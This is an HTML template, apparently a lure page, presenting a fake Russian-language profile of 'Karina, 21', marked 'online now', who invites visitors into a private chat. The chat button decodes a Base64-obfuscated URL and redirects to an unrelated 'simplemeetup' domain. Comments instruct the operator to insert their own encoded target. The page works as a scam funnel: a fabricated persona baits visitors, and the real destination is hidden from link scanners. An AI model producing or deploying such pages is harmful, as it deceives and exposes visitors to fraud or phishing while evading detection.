<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Личный профиль</title>
  <style>
    body {
      margin: 0;
      background: #0f0f12;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      padding: 24px;
      box-sizing: border-box;
    }
    .avatar-wrapper {
      position: relative;
      margin-bottom: 16px;
    }
    .avatar {
      width: 110px;
      height: 110px;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid #ff3366;
      box-shadow: 0 0 20px rgba(255, 51, 102, 0.4);
    }
    .badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(46, 213, 115, 0.15);
      color: #2ed573;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 500;
      margin-bottom: 16px;
    }
    .badge-dot {
      width: 8px;
      height: 8px;
      background: #2ed573;
      border-radius: 50%;
    }
    h1 {
      font-size: 24px;
      font-weight: 700;
      margin: 0 0 8px 0;
    }
    p {
      font-size: 15px;
      color: #9aa0a6;
      margin: 0 0 28px 0;
      line-height: 1.4;
    }
    .btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      max-width: 280px;
      background: linear-gradient(135deg, #ff3366, #ff5e62);
      color: #ffffff;
      text-decoration: none;
      padding: 16px;
      font-size: 16px;
      font-weight: 700;
      border-radius: 30px;
      box-shadow: 0 6px 20px rgba(255, 51, 102, 0.4);
      cursor: pointer;
      border: none;
      transition: transform 0.2s;
    }
    .btn:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>

  <div class="avatar-wrapper">
    <!-- Ссылка на аватарку (загруженную в репозиторий или сторонний хостинг) -->
    <img class="avatar" src="avatar.jpg" alt="Photo">
  </div>

  <div class="badge">
    <div class="badge-dot"></div>
    Онлайн сейчас
  </div>

  <h1>Карина, 21</h1>
  <p>Скучно быть одной😥<br>Напиши мне в привате 👇</p>

  <!-- Кнопка вызывает безопасный JS редирект -->
  <button class="btn" onclick="openChat()">ПЕРЕЙТИ В ЧАТ</button>

  <script>
    // Вставь зашифрованную Base64 строку внутрь кавычек
    const encodedTarget = "aHR0cHM6Ly9sMHRwaHJoLnNpbXBsZW1lZXR1cC5vcmcvbTh0MmMzdg==";

    function openChat() {
      try {
        const decodedUrl = atob(encodedTarget);
        window.location.href = decodedUrl;
      } catch (e) {
        console.error("Redirect error");
      }
    }
  </script>
</body>
</html>
